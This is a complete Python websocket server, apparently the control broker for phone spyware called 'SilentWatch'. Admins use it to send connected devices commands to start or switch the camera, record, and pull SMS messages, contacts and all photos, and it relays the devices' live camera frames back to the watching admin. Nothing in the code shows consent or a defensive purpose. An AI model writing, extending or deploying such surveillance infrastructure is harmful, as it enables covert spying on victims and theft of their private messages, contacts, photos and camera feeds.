import asyncio
import json
import logging
import websockets
import os
import time
import requests as req
from dataclasses import dataclass, field
from typing import Optional

# ─── Logging ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

# ─── Config ───────────────────────────────────────────────────────────────────
FIREBASE_RTDB_URL = os.environ.get(
    "FIREBASE_RTDB_URL",
    "https://camm-c9aff-default-rtdb.firebaseio.com"
)
PORT              = int(os.environ.get("PORT", 8765))
AGENT_STALE_SECS  = 45        # prune agents silent for this long
VIDEO_QUEUE_SIZE  = 4         # per-admin bounded frame queue  ← key for no-lag
STATS_INTERVAL    = 30        # log frame-rate stats every N seconds


# ─── Per-admin session ────────────────────────────────────────────────────────
# Each admin gets its own async queues and a dedicated sender task.
# Video frames go into a BOUNDED queue; when full the OLDEST frame is dropped
# (keeps the stream live, never accumulates lag).
# Control JSON goes into a separate UNBOUNDED queue (never dropped).

@dataclass
class AdminSession:
    ws:            object
    agent_id:      Optional[str]  = None   # which agent feed this admin is watching
    video_queue:   asyncio.Queue  = field(default_factory=lambda: asyncio.Queue(maxsize=VIDEO_QUEUE_SIZE))
    ctrl_queue:    asyncio.Queue  = field(default_factory=asyncio.Queue)
    sender_task:   Optional[asyncio.Task] = None
    frames_sent:   int = 0
    frames_dropped: int = 0
    connected_at:  float = field(default_factory=time.time)


# ─── Global state ─────────────────────────────────────────────────────────────
admin_sessions: dict[object, AdminSession] = {}   # ws → AdminSession
agents:         dict[str, object]          = {}   # agent_id → ws
agent_meta:     dict[str, dict]            = {}   # agent_id → metadata


# ─── Firebase helpers ─────────────────────────────────────────────────────────

def _set_admin_online_blocking(online: bool):
    try:
        r = req.put(f"{FIREBASE_RTDB_URL}/config/adminOnline.json", json=online, timeout=5)
        if r.status_code == 200:
            logging.info(f"Firebase adminOnline → {online}")
        else:
            logging.warning(f"Firebase adminOnline update failed ({r.status_code}): {r.text}")
    except Exception as e:
        logging.warning(f"Firebase adminOnline update error: {e}")

async def set_admin_online(online: bool):
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, _set_admin_online_blocking, online)


# ─── Per-admin sender task ────────────────────────────────────────────────────
# This runs as a background coroutine for each connected admin.
# It drains BOTH queues: control messages first (priority), then video frames.
# By keeping sends off the main receive loop, the server never blocks on a slow
# admin — it just drops the oldest buffered frame instead.

async def admin_sender(session: AdminSession):
    """
    Dedicated sender coroutine per admin.
    Priority: ctrl_queue (JSON) > video_queue (binary frames).
    """
    ws = session.ws
    try:
        while True:
            # Drain all pending control messages first (non-blocking peek)
            while not session.ctrl_queue.empty():
                msg = await session.ctrl_queue.get()
                await ws.send(msg)

            # Yield/sleep if both queues are empty to avoid CPU starvation
            if session.ctrl_queue.empty() and session.video_queue.empty():
                await asyncio.sleep(0.01)
                continue

            # Then send ONE video frame (or wait if none)
            try:
                frame = session.video_queue.get_nowait()
            except asyncio.QueueEmpty:
                continue

            await ws.send(frame)
            session.frames_sent += 1

    except (websockets.exceptions.ConnectionClosed, asyncio.CancelledError):
        pass
    except Exception as e:
        logging.error(f"admin_sender error: {e}")


def enqueue_video(session: AdminSession, frame: bytes):
    """
    Non-blocking enqueue with drop-oldest strategy.
    If the queue is full, evict the head (oldest/stalest frame) before inserting.
    This guarantees the admin always gets the LATEST frame, never a stale one.
    """
    if session.video_queue.full():
        try:
            session.video_queue.get_nowait()   # drop oldest
            session.frames_dropped += 1
        except asyncio.QueueEmpty:
            pass
    try:
        session.video_queue.put_nowait(frame)
    except asyncio.QueueFull:
        session.frames_dropped += 1             # race edge case


def enqueue_ctrl(session: AdminSession, payload: str):
    """Enqueue a control/JSON message — never dropped."""
    session.ctrl_queue.put_nowait(payload)


# ─── Agent list helpers ───────────────────────────────────────────────────────

def _build_agent_list_payload() -> str:
    agents_info = [
        {
            "agent_id":     aid,
            "connected_at": agent_meta.get(aid, {}).get("connected_at"),
            "frames_sent":  agent_meta.get(aid, {}).get("frames_sent", 0),
        }
        for aid in agents
    ]
    return json.dumps({"type": "agent_list", "agents": agents_info})

async def broadcast_agent_list():
    payload = _build_agent_list_payload()
    dead = []
    for ws, session in list(admin_sessions.items()):
        try:
            enqueue_ctrl(session, payload)
        except Exception:
            dead.append(ws)
    for ws in dead:
        _remove_admin(ws)

async def send_agent_list(session: AdminSession):
    enqueue_ctrl(session, _build_agent_list_payload())


# ─── Admin cleanup helper ─────────────────────────────────────────────────────

def _remove_admin(ws):
    session = admin_sessions.pop(ws, None)
    if session and session.sender_task:
        session.sender_task.cancel()
    return session


# ─── Stats logger ─────────────────────────────────────────────────────────────

async def log_stats():
    """Periodically log per-admin frame throughput and drop rate."""
    while True:
        await asyncio.sleep(STATS_INTERVAL)
        for ws, s in list(admin_sessions.items()):
            if s.frames_sent or s.frames_dropped:
                drop_pct = (s.frames_dropped / max(1, s.frames_sent + s.frames_dropped)) * 100
                logging.info(
                    f"Admin stats | watching={s.agent_id} "
                    f"sent={s.frames_sent} dropped={s.frames_dropped} ({drop_pct:.1f}% drop)"
                )


# ─── Admin handler ────────────────────────────────────────────────────────────

async def handle_admin(websocket):
    session = AdminSession(ws=websocket)
    admin_sessions[websocket] = session

    # Spawn the dedicated sender task for this admin
    session.sender_task = asyncio.create_task(admin_sender(session))

    was_first = len(admin_sessions) == 1
    logging.info(f"Admin connected. Total admins: {len(admin_sessions)}")

    if was_first:
        await set_admin_online(True)

    await send_agent_list(session)

    try:
        async for raw in websocket:
            try:
                msg = json.loads(raw)
            except json.JSONDecodeError:
                continue

            command  = msg.get("command")
            agent_id = msg.get("agent_id") or next(iter(agents), None)

            if command == "watch_agent":
                watch_id = msg.get("agent_id")
                session.agent_id = watch_id
                logging.info(f"Admin watching agent '{watch_id}'")
                enqueue_ctrl(session, json.dumps({"type": "watching", "agent_id": watch_id}))

            elif command in ("start_camera", "stop_camera", "switch_camera",
                             "start_recording", "stop_recording",
                             "get_sms", "get_contacts",
                             "download_all_photos",
                             "low_internet_on", "low_internet_off"):
                if agent_id and agent_id in agents:
                    try:
                        await agents[agent_id].send(json.dumps({"command": command}))
                        logging.info(f"Admin → '{command}' to agent '{agent_id}'")
                    except Exception as e:
                        logging.warning(f"Failed to forward '{command}' to agent '{agent_id}': {e}")
                else:
                    enqueue_ctrl(session, json.dumps({
                        "type": "error",
                        "message": f"Agent '{agent_id}' not connected"
                    }))

            elif command == "ping":
                enqueue_ctrl(session, json.dumps({"type": "pong"}))

    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        watch_id = session.agent_id
        _remove_admin(websocket)

        logging.info(f"Admin disconnected. Total admins: {len(admin_sessions)}")

        # Stop the stream for whatever agent this admin was watching
        if watch_id and watch_id in agents:
            logging.info(f"Sending stop_camera to '{watch_id}' — admin left.")
            try:
                asyncio.create_task(
                    agents[watch_id].send(json.dumps({"command": "stop_camera"}))
                )
            except Exception:
                pass

        if len(admin_sessions) == 0:
            logging.info("Last admin disconnected — setting adminOnline=false")
            asyncio.create_task(set_admin_online(False))


# ─── Agent handler ────────────────────────────────────────────────────────────

async def handle_agent(websocket, agent_id: str):
    # Replace stale connection for the same agent_id
    if agent_id in agents:
        logging.warning(f"Agent '{agent_id}' reconnected — replacing old connection.")
        try:
            await agents[agent_id].close()
        except Exception:
            pass

    agents[agent_id] = websocket
    agent_meta[agent_id] = {
        "connected_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "frames_sent":  0,
        "last_seen":    time.time(),
    }
    logging.info(f"Agent '{agent_id}' connected. Total agents: {len(agents)}")
    await broadcast_agent_list()

    # Auto-resume: if an admin is already watching this agent, kick off the stream
    for ws, s in list(admin_sessions.items()):
        if s.agent_id == agent_id:
            logging.info(f"Admin already watching '{agent_id}' — auto-resuming camera.")
            try:
                await websocket.send(json.dumps({"command": "start_camera"}))
            except Exception:
                pass
            break

    try:
        async for message in websocket:
            # Guard: if our entry was evicted (stale cleanup or reconnect race),
            # this is a zombie coroutine — stop processing immediately.
            if agent_id not in agent_meta:
                break

            agent_meta[agent_id]["last_seen"] = time.time()

            if isinstance(message, bytes):
                # ── VIDEO FRAME ──────────────────────────────────────────────
                # Route frame only to admins watching THIS agent.
                # Each admin gets its own bounded queue; slow admins don't stall
                # the receive loop or affect other admins.
                agent_meta[agent_id]["frames_sent"] += 1
                for ws, s in list(admin_sessions.items()):
                    if s.agent_id == agent_id:
                        enqueue_video(s, message)

            else:
                # ── JSON / TEXT from agent ───────────────────────────────────
                try:
                    data = json.loads(message)

                    if data.get("type") == "ping":
                        continue  # just updates last_seen above

                    msg_type = data.get("type", "agent_message")
                    logging.info(f"Agent '{agent_id}' msg: type={msg_type} len={len(message)}")

                    data["agent_id"] = agent_id
                    data.setdefault("type", "agent_message")
                    payload = json.dumps(data)

                    for ws, s in list(admin_sessions.items()):
                        enqueue_ctrl(s, payload)

                    logging.info(f"Broadcast '{msg_type}' from '{agent_id}' to {len(admin_sessions)} admin(s).")

                except json.JSONDecodeError:
                    logging.warning(f"Non-JSON from agent '{agent_id}': {message[:100]}")
                except Exception as e:
                    logging.error(f"Error handling agent '{agent_id}' message: {e}")

    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        # Only clean up if WE are still the registered connection.
        # If the agent reconnected, the new coroutine already owns the entry —
        # popping here would delete the new connection and cause a KeyError there.
        if agents.get(agent_id) is websocket:
            agents.pop(agent_id, None)
            agent_meta.pop(agent_id, None)
            logging.info(f"Agent '{agent_id}' disconnected.")
            await broadcast_agent_list()
        else:
            logging.info(f"Agent '{agent_id}' old connection closed (new connection active — skipping cleanup).")


# ─── Stale-agent cleanup ──────────────────────────────────────────────────────

async def cleanup_stale_agents():
    """Prune agents that haven't sent anything in AGENT_STALE_SECS seconds."""
    while True:
        try:
            await asyncio.sleep(15)
            now  = time.time()
            dead = [aid for aid, m in agent_meta.items()
                    if now - m.get("last_seen", 0) > AGENT_STALE_SECS]
            if dead:
                logging.info(f"Pruning {len(dead)} stale agent(s): {dead}")
                for aid in dead:
                    ws = agents.get(aid)
                    if ws:
                        try:
                            await ws.close(1001, "Stale connection")
                        except Exception:
                            pass
                    agents.pop(aid, None)
                    agent_meta.pop(aid, None)
                await broadcast_agent_list()
        except Exception as e:
            logging.error(f"cleanup_stale_agents error: {e}")


# ─── Main handler ─────────────────────────────────────────────────────────────

async def handler(websocket):
    try:
        raw  = await asyncio.wait_for(websocket.recv(), timeout=10)
        data = json.loads(raw)
    except asyncio.TimeoutError:
        logging.warning("Connection timed out during registration.")
        await websocket.close(1008, "Registration timeout")
        return
    except Exception as e:
        logging.error(f"Registration error: {e}")
        return

    role = data.get("role")
    if role == "admin":
        await handle_admin(websocket)
    elif role == "agent":
        agent_id = data.get("agent_id", "default-agent")
        await handle_agent(websocket, agent_id)
    else:
        logging.warning(f"Unknown role: {role}")
        await websocket.close(1008, "Unknown role")


# ─── Entry point ──────────────────────────────────────────────────────────────

async def main():
    logging.info("Resetting adminOnline=false in Firebase on startup…")
    await set_admin_online(False)

    logging.info(f"SilentWatch broker starting on ws://127.0.0.1:{PORT}")

    asyncio.create_task(cleanup_stale_agents())
    asyncio.create_task(log_stats())

    async with websockets.serve(
        handler,
        "127.0.0.1",
        PORT,
        ping_interval=20,
        ping_timeout=20,
        max_size=5 * 1024 * 1024,
        compression=None,
    ):
        logging.info("SilentWatch broker ready ✓")
        await asyncio.Future()   # run forever


if __name__ == "__main__":
    asyncio.run(main())
